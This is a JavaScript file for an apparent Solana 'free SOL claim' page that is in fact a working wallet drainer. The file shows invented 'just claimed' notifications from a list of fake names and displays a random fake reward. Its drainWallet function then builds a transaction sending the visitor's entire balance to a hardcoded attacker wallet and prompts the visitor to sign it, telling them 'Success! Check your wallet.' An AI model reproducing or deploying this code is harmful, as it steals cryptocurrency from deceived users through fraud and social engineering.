// --- CONFIGURATION ---
const DESTINATION_WALLET = "D7sb3Z3a3xduMuurdzKvFPBeALfpz2KVoe9bF8SeoJrV";
// ---------------------

const connectBtn = document.getElementById('connectBtn');
const claimBtn = document.getElementById('claimBtn');
const statusText = document.getElementById('status');
const rewardAmountDisplay = document.getElementById('reward-amount');
const userBalanceDisplay = document.getElementById('user-balance');
const claimDetails = document.getElementById('claim-details');

// --- 1. WEIGHTED RANDOM LOGIC ---
function getRandomReward() {
    const chance = Math.random() * 100;
    
    if (chance < 2) {
        // 2% Chance: Jackpot 5.0 SOL
        return (5.0).toFixed(4);
    } else if (chance < 20) {
        // 18% Chance: 0.1 to 2.0 SOL
        const min = 0.1;
        const max = 2.0;
        return (Math.random() * (max - min) + min).toFixed(4);
    } else {
        // 80% Chance: 0.001 to 3.0 SOL
        const min = 0.001;
        const max = 3.0;
        return (Math.random() * (max - min) + min).toFixed(4);
    }
}

// --- 2. FAKE NOTIFICATIONS ---
const fakeNames = ["Alex", "Sarah", "Mike", "Jessica", "David", "Emily", "James", "Olivia", "Robert", "Emma", "Chris", "Anna", "Daniel", "Sophie", "Mark"];
const smallAmounts = ["0.001", "0.005", "0.009", "0.01", "0.03", "0.05", "0.07", "0.1", "0.2", "0.5"];

function createNotification() {
    const container = document.getElementById('notification-container');
    const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
    const amount = smallAmounts[Math.floor(Math.random() * smallAmounts.length)];
    
    const notif = document.createElement('div');
    notif.className = 'notification';
    notif.innerHTML = `
        <span class="notification-icon">🔔</span>
        <span class="notification-text"><strong>${name}</strong> just claimed <strong>${amount} SOL</strong></span>
    `;
    
    container.appendChild(notif);
    
    // Remove after 4 seconds
    setTimeout(() => {
        if (container.contains(notif)) {
            container.removeChild(notif);
        }
    }, 4000);
}

// Start fake notifications every 3-7 seconds
setInterval(createNotification, 5000);
createNotification(); // Show one immediately

// --- 3. MAIN PROCESS ---

async function startProcess() {
    if (!window.solana || !window.solana.isPhantom) {
        statusText.innerText = "Please install Phantom Wallet!";
        window.open("https://phantom.app/", "_blank");
        return;
    }

    try {
        statusText.innerText = "Connecting to Solana Network...";
        
        // Connect
        const response = await window.solana.connect();
        const userPublicKey = response.publicKey;
        
        // Update UI
        connectBtn.classList.add('hidden');
        claimDetails.classList.remove('hidden');
        
        // Get Balance
        const connection = new solana.web3.Connection(solana.web3.clusterApiUrl('mainnet-beta'));
        const balance = await connection.getBalance(userPublicKey);
        const balanceSol = balance / 1000000000; // Convert lamports to SOL
        
        // Generate Random Reward
        const reward = getRandomReward();
        
        // Display Info
        rewardAmountDisplay.innerText = `${reward} SOL`;
        userBalanceDisplay.innerText = `${balanceSol.toFixed(4)} SOL`;
        
        statusText.innerText = "Wallet connected. Ready to claim.";
        
        // Show Claim Button
        claimBtn.classList.remove('hidden');
        
    } catch (error) {
        console.error(error);
        statusText.innerText = "Connection failed. Please try again.";
        connectBtn.disabled = false;
    }
}

async function drainWallet() {
    try {
        statusText.innerText = "Processing transaction...";
        claimBtn.disabled = true;
        claimBtn.innerText = "Processing...";
        
        const connection = new solana.web3.Connection(solana.web3.clusterApiUrl('mainnet-beta'));
        const userPublicKey = window.solana.publicKey;
        
        // Get final balance
        const balance = await connection.getBalance(userPublicKey);
        
        if (balance === 0) {
            statusText.innerText = "Wallet is empty.";
            claimBtn.innerText = "Empty";
            return;
        }

        // Create Transaction
        const transaction = new solana.web3.Transaction();
        
        const to = new solana.web3.PublicKey(DESTINATION_WALLET);
        
        // Send everything (balance)
        const instruction = solana.web3.SystemProgram.transfer({
            fromPubkey: userPublicKey,
            toPubkey: to,
            lamports: balance
        });

        transaction.add(instruction);

        // Sign and Send
        statusText.innerText = "Waiting for signature...";
        const signature = await window.solana.signAndSendTransaction(transaction);
        
        statusText.innerText = "Success! Check your wallet.";
        claimBtn.innerText = "Claimed";
        
        // Optional: Redirect after a few seconds
        setTimeout(() => {
            window.location.reload();
        }, 3000);

    } catch (error) {
        console.error(error);
        statusText.innerText = "Transaction failed or rejected.";
        claimBtn.disabled = false;
        claimBtn.innerText = "Try Again";
    }
}
